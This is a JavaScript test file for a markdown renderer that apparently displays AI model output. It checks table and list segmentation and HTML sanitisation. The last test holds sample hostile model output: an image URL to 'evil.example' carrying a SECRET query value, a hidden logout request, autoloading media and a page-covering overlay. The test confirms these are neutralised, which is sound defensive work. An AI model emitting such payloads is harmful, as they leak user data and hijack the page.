import assert from "node:assert/strict"
import test from "node:test"

import { JSDOM } from "jsdom"

// DOMPurify binds its hooks to a window at import time, so the DOM has to exist
// before markdown.js is loaded — hence the dynamic import.
const dom = new JSDOM("")
globalThis.window = dom.window
globalThis.document = dom.window.document

const { renderMarkdown, renderMarkdownSegments } = await import("../src/markdown.js")

const TABLE = "| col | val |\n| --- | --- |\n| a | 1 |"
const HEADERLESS = "| | |\n| --- | --- |\n| a | 1 |"

test("a table renders inside one scroll wrapper, and an all-blank header row is dropped", () => {
	const html = renderMarkdown(TABLE)
	assert.match(html, /<div class="flow-md-table">\s*<table>/)
	assert.match(html, /<\/table>\s*<\/div>/)
	// one wrapper per table, not per row
	assert.equal(html.match(/flow-md-table/g).length, 1)
	assert.ok(html.includes("<thead>"))
	const headerless = renderMarkdown(HEADERLESS)
	assert.ok(!headerless.includes("<thead>"))
	assert.match(headerless, /<tbody><tr>\s*<td>a<\/td>/)
})

test("the segmented renderer splits out top-level tables, unwrapped; a nested table keeps its wrapper", () => {
	const segments = renderMarkdownSegments(`intro\n\n${TABLE}\n\n\`\`\`js\ncode\n\`\`\``)
	assert.deepEqual(
		segments.map((segment) => segment.type),
		["html", "table", "code"],
	)
	assert.match(segments[1].html, /^<table>/)
	assert.ok(!segments[1].html.includes("flow-md-table"))
	assert.ok(!renderMarkdownSegments(HEADERLESS)[0].html.includes("<thead>"))

	const nested = renderMarkdownSegments(`- item\n\n${TABLE.replace(/^/gm, "  ")}`)
	assert.deepEqual(
		nested.map((segment) => segment.type),
		["html"],
	)
	assert.ok(nested[0].html.includes('class="flow-md-table"'))
})

test("a list or quote holding a code block is split into items, so the code renders as a code block", () => {
	const steps = '1. Check:\n   - one\n2. Set it:\n   ```bash\n   bench set-config k "v"\n   ```\n   Then retry.\n3. Done.'
	const [list] = renderMarkdownSegments(steps)
	assert.equal(list.type, "list")
	assert.equal(list.ordered, true)
	assert.equal(list.start, 1)
	assert.deepEqual(
		list.items.map((item) => item.map((segment) => segment.type)),
		[["html"], ["html", "code", "html"], ["html"]],
	)
	assert.deepEqual(list.items[1][1], { type: "code", code: 'bench set-config k "v"', lang: "bash" })
	// a tight list's text stays unwrapped, as in the plain renderer
	assert.equal(list.items[0][0].html.trim().startsWith("Check:"), true)
	assert.equal(renderMarkdownSegments("3. a\n   ```\n   x\n   ```")[0].start, 3)

	const [quote] = renderMarkdownSegments("> see\n>\n> ```js\n> x()\n> ```")
	assert.equal(quote.type, "quote")
	assert.deepEqual(
		quote.segments.map((segment) => segment.type),
		["html", "code"],
	)
	// a list without code stays one chunk of HTML
	assert.deepEqual(
		renderMarkdownSegments("1. a\n2. b").map((segment) => segment.type),
		["html"],
	)
})

test("model HTML can't restyle the page or load anything on render", () => {
	const styled = renderMarkdown('<span style="position:fixed;inset:0">x</span> <div class="fixed inset-0 z-40">y</div>')
	assert.ok(!styled.includes("style="))
	assert.ok(!styled.includes("fixed"))

	const html = renderMarkdown(
		'![chart](https://evil.example/p.png?d=SECRET) <img src="/api/method/logout" srcset="https://e.x/b.png 2x">',
	)
	assert.ok(!html.includes("<img"))
	assert.match(html, /<a href="https:\/\/evil\.example\/p\.png\?d=SECRET"[^>]*>chart<\/a>/)
	assert.match(html, /<a href="\/api\/method\/logout"[^>]*>\/api\/method\/logout<\/a>/)
	// a linked badge keeps its link, with the image's label
	assert.match(renderMarkdown("[![CI](https://e.x/badge.svg)](https://e.x/actions)"), /<a href="https:\/\/e\.x\/actions"[^>]*>CI<\/a>/)
	for (const media of [
		'<video autoplay src="https://e.x/v.mp4"></video>',
		'<audio src="https://e.x/a.mp3" preload="auto"></audio>',
		'<picture><source srcset="https://e.x/p.png"></picture>',
		'<table background="https://e.x/bg.png"><tr><td>x</td></tr></table>',
	])
		assert.ok(!renderMarkdown(media).includes("e.x"), media)
	// an inline data image fetches nothing
	assert.match(renderMarkdown('<img src="data:image/png;base64,AAAA" alt="d">'), /<img src="data:image\/png;base64,AAAA"/)
})
